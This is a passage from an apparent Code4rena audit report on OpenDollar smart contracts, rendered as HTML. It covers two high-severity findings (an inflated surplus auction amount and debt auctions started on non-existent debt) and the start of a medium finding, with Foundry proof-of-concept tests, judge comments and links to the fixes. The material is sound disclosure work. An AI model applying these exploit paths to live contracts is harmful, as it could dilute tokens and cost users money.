(_params.surplusTransferPercentage &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      if (extraSurplusReceiver == address(0)) revert AccEng_NullSurplusReceiver();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      safeEngine.transferInternalCoins({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        _source: address(this),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        _destination: extraSurplusReceiver,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        _rad: _params.surplusAmount.wmul(_params.surplusTransferPercentage)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      lastSurplusTime = block.timestamp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      emit TransferSurplus(extraSurplusReceiver, _params.surplusAmount.wmul(_params.surplusTransferPercentage));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n</details>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/26#issuecomment-1780191087\">RaymondFam (Lookout) commented</a>:</strong></p>\n<blockquote>\n<p><code>_amountToSell</code> is indeed very close to 100 times (99% plus).</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/26#issuecomment-1783550386\">pi0neerpat (OpenDollar) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/26#issuecomment-1792490617\">MiloTruck (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has demonstrated how due to the incorrect use of <code>ONE_HUNDRED_WAD</code> instead of <code>WAD</code> when calculating percentages, surplus auctions will be created with massively inflated values, breaking the accounting of the protocol. As such, I agree with high severity.</p>\n<p>Selected this report for best as it outlines the issues, impacts and recommended mitigation really well despite the lack of a coded PoC.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/26#issuecomment-1861161709\">pi0neerpat (OpenDollar) commented</a></strong></p>\n<blockquote>\n<p>Resolved <a href=\"https://github.com/open-dollar/od-contracts/pull/254\">here</a>.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-02-missing-debt-check-lets-users-start-a-debt-auction-of-non-existent-debt\" style=\"position:relative;\"><a href=\"#h-02-missing-debt-check-lets-users-start-a-debt-auction-of-non-existent-debt\" aria-label=\"h 02 missing debt check lets users start a debt auction of non existent debt permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/24\">[H-02] Missing debt check lets users start a debt auction of non-existent debt</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/24\">Saintcode_</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/87\">T1MOH</a> and <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/27\">falconhoof</a></em></p>\n<p>The <code>AccountingEngine.sol</code> contract serves as the protocol’s central component responsible for initializing both debt and surplus auctions. Debt auctions are consistently initiated with a predefined minimum bid referred to as debtAuctionBidSize. This is done to ensure that the protocol can only auction debt that is not currently undergoing an auction and is not locked within the debt queue, as articulated in the comment found on <code>IAccountingEngine:248</code>: “It can only auction debt that has been popped from the debt queue and is not already being auctioned”. This necessity prompts the check on AccountingEngine:181:</p>\n<p><code>if (_params.debtAuctionBidSize > _unqueuedUnauctionedDebt(_debtBalance))</code></p>\n<p>This check verifies that there is a sufficient amount of bad debt available to auction.</p>\n<p>The issue stems in line 183, where <code>_settleDebt</code> is called, this aims to ensure that only bad debt is considered for the auction. However, if the remaining bad debt, after settlement, falls below the specified threshold <code>(debtAuctionBidSize &#x3C;= unqueuedUnauctionedDebt())</code>, the auction still starts with an incorrect amount of bad debt coverage, diluting the protocol Token when it is not yet needed.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Non-existent debt gets auctioned when it is not necesary which dilutes the protocol token.</p>\n<h3 id=\"poc\" style=\"position:relative;\"><a href=\"#poc\" aria-label=\"poc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PoC</h3>\n<p>The attached Proof of Concept (PoC) demonstrates two test cases:</p>\n<ul>\n<li>In the initial test case, a two-call flow is implemented. The “settleDebt” function must be externally triggered before initiating an auction. This design ensures that a check for insufficient debt occurs prior to creating an auction. Consequently, as after calling settleDebt there is inadequate debt, the operation will revert.</li>\n<li>In the second case, the <code>auctionDebt</code> function is invoked directly. It is expected to behave in the same manner as in the first test case (because the funciton calls <code>_settleDebt</code> internally). However, in this second test case, the execution follows a different path. Rather than replicating the behavior of the initial test case by reverting not starting the auction, the execution succeeds, resulting in the creation of a debt auction even when there is no existing debt.</li>\n</ul>\n<p>The following tests have been created using the protocol’s test suite:</p>\n<p>First test case (original two call flow):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_missing_insuficient_debt_check_part2</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">accountingEngine</span><span class=\"mtk1\">.</span><span class=\"mtk11\">modifyParameters</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;surplusTransferPercentage&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">accountingEngine</span><span class=\"mtk1\">.</span><span class=\"mtk11\">modifyParameters</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;extraSurplusReceiver&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">safeEngine</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createUnbackedDebt</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">accountingEngine</span><span class=\"mtk1\">), </span><span class=\"mtk11\">rad</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_popDebtFromQueue</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">accountingEngine</span><span class=\"mtk1\">.</span><span class=\"mtk11\">settleDebt</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountingEngine</span><span class=\"mtk1\">.</span><span class=\"mtk11\">auctionDebt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>Second test case (vulnerability):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_missing_insuficient_debt_check_part2</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">accountingEngine</span><span class=\"mtk1\">.</span><span class=\"mtk11\">modifyParameters</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;surplusTransferPercentage&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">accountingEngine</span><span class=\"mtk1\">.</span><span class=\"mtk11\">modifyParameters</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;extraSurplusReceiver&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">safeEngine</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createUnbackedDebt</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">accountingEngine</span><span class=\"mtk1\">), </span><span class=\"mtk11\">rad</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_popDebtFromQueue</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountingEngine</span><span class=\"mtk1\">.</span><span class=\"mtk11\">auctionDebt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>Both test cases should revert and not let a user create a debt Auction under insufficient debt circumstances, but as stated on the report the second test case succeeds and creates the Auction.</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>To mitigate this risk, I suggest introducing the check <code>(_params.debtAuctionBidSize > _unqueuedUnauctionedDebt(_debtBalance))</code> after calling _settleDebt to ensure there exists enough amount of bad in the contract after the settling.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/24#issuecomment-1780182988\">RaymondFam (Lookout) commented</a>:</strong></p>\n<blockquote>\n<p>Seems like <code>_params.debtAuctionBidSize > _unqueuedUnauctionedDebt(_debtBalance)</code> check is well in place prior to settling the debt in the second case, but will let the sponsor look into it.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/24#issuecomment-1793315875\">MiloTruck (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>Due to the misplacement of the <code>_params.debtAuctionBidSize > _unqueuedUnauctionedDebt(_debtBalance)</code> check before <code>_settleDebt()</code> is called, the protocol will create debt auctions even when the amount of bad debt is below <code>params.debtAuctionBidSize</code>. This leads to dilution of the protocol token as bidders can buy non-existent debt, thereby destabilizing the value of protocol’s token. As such, I agree with high severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/24#issuecomment-1861163388\">pi0neerpat (OpenDollar) commented</a></strong></p>\n<blockquote>\n<p>Resolved <a href=\"https://github.com/open-dollar/od-contracts/pull/253\">here</a>.</p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-15\" style=\"position:relative;\"><a href=\"#medium-risk-findings-15\" aria-label=\"medium risk findings 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (15)</h1>\n<h2 id=\"m-01-odsafemanagerallowsafe-cannot-be-executed-either-by-the-proxy-contract-or-any-other-address\" style=\"position:relative;\"><a href=\"#m-01-odsafemanagerallowsafe-cannot-be-executed-either-by-the-proxy-contract-or-any-other-address\" aria-label=\"m 01 odsafemanagerallowsafe cannot be executed either by the proxy contract or any other address permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/429\">[M-01] <code>ODSafeManager#allowSAFE()</code> cannot be executed either by the proxy contract or any other address.</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/429\">0xAadi</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/447\">Giorgio</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/421\">perseus</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/322\">Arz</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/315\">ge6a</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/313\">0xprinc</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/294\">yashar</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/263\">Greed</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/241\">0xlemon</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/231\">m4k2</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/205\">btk</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/191\">xAriextz</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/170\">MrPotatoMagic</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/157\">nmirchev8</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/76\">T1MOH</a>, and <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/248\">0xDemon</a></em></p>\n<p>“According to the GEB framework, the proxy contracts (<code>ODProxy</code>) are designed to interact with the Safe Manager (<code>ODSafeManager</code>) through the Proxy Action contract (<code>BasicActions</code>). The pivotal function, <code>allowSAFE()</code>, is responsible for granting an address the capability to manage the Safe. Unfortunately, the <code>BasicActions</code> contract lacks the implementation of the <code>allowSAFE()</code> function. Consequently, the proxy contract is unable to execute <code>allowSAFE()</code>, leading to the inaccessibility of several critical functions for authorized users.</p>\n<p>The functionality of essential operations such as <code>modifySAFECollateralization()</code>, <code>transferCollateral()</code>, <code>transferInternalCoins()</code>, <code>quitSystem()</code>, <code>enterSystem()</code>, <code>moveSAFE()</code>, <code>removeSAFE()</code>, and <code>protectSAFE()</code> is currently halted due to the inability to allow users to manage the Safe.</p>\n<p>In addition to the absent <code>allowSAFE()</code> implementation, the following functions are also not yet implemented in the <code>BasicActions</code> contract and these functions are not directly executable by proxy contract: <code>allowHandler()</code>, <code>modifySAFECollateralization()</code>, <code>transferCollateral()</code>, <code>transferInternalCoins()</code>, <code>quitSystem()</code>, <code>enterSystem()</code>, <code>moveSAFE()</code>, <code>removeSAFE()</code>, and <code>protectSAFE()</code>.”</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Place the following test file in <code>test/nft/anvil/</code> and run <code>forge t --fork-url http://127.0.0.1:8545 --match-path test/nft/anvil/NFTTestAnvil.t.sol -vvv</code></p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: GPL-3.0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">19</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;forge-std/console.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">AnvilFork</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;@test/nft/anvil/AnvilFork.t.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">Vault721</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;@contracts/proxies/Vault721.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">IODSafeManager</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;@interfaces/proxies/IODSafeManager.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">ODProxy</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;@contracts/proxies/ODProxy.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">NFTTestAnvil</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">AnvilFork</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_setup</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalVaults</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vault721</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">checkProxyAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">checkVaultIds</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Function to test open safe and allow safe with direct call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_allowSafeDirectCall</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cType</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">cTypes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">users</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">);  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">safeId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">safeManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">openSAFE</span><span class=\"mtk1\">(</span><span class=\"mtk12\">cType</span><span class=\"mtk1\">,</span><span class=\"mtk12\">_proxy</span><span 